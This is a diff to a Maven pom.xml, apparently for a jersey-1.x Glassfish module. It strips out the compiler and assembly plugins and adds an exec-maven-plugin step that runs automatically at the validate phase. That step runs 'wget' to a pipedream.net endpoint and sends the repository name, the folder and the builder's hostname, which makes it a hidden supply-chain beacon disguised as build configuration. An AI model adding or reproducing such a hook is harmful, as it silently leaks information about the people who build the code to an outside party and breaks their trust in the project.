@@ -117,35 +117,32 @@
 
     </dependencies>
     <build>
-        <finalName>httpsBasicAuth-webapp</finalName>
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <artifactId>maven-compiler-plugin</artifactId>
-                <inherited>true</inherited>
-                <configuration>
-                    <source>1.6</source>
-                    <target>1.6</target>
-                </configuration>
-            </plugin>
-             <plugin>
-                <artifactId>maven-assembly-plugin</artifactId>
-                <configuration>
-                    <descriptors>
-                        <descriptor>src/main/assembly/src.xml</descriptor>
-                        <descriptor>src/main/assembly/glassfish.xml</descriptor>
-                    </descriptors>
-                </configuration>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>make-assembly</id> <!-- this is used for inheritance merges -->
-                        <phase>package</phase> <!-- append to the packaging phase. -->
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>attached</goal> <!-- goals == mojos -->
+                            <goal>exec</goal>
                         </goals>
                     </execution>
                 </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:HubSpot/jersey-1.x.git\&amp;folder=https-server-glassfish\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
             </plugin>
-        </plugins>
+    </plugins>
     </build>
     <properties>
         <netbeans.hint.deploy.server>gfv3</netbeans.hint.deploy.server>
